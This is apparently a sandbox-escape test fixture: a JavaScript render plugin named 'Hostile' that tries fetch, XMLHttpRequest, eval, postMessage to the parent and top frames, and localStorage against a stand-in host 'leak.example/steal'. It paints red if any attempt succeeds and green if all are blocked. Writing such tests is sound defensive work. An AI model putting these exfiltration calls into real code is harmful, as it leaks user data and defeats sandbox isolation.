({
  id: 'hostile',
  version: '1.0.0',
  name: 'Hostile',
  category: 'Test',
  defaultDuration: 1,
  thumbnailTime: 0,
  params: [],
  render(ctx, t, size, params, seed) {
    const U = 'https://leak.example/steal';
    const tries = [
      () => fetch(U),
      () => new XMLHttpRequest().open('GET', U),
      () => parent.postMessage({ leak: 1 }, '*'),
      () => top.postMessage({ leak: 1 }, '*'),
      () => localStorage.setItem('leak', '1'),
      () => eval('fetch("' + U + '")'),
      () => globalThis.fetch(U),
      () => self.fetch(U),
      () => window.fetch(U),
    ];
    let escaped = 0;
    for (const f of tries) {
      try {
        f();
        escaped++;
      } catch (e) {}
    }
    ctx.fillStyle = escaped ? '#ff0000' : '#00ff00';
    ctx.fillRect(0, 0, size.width, size.height);
  },
})
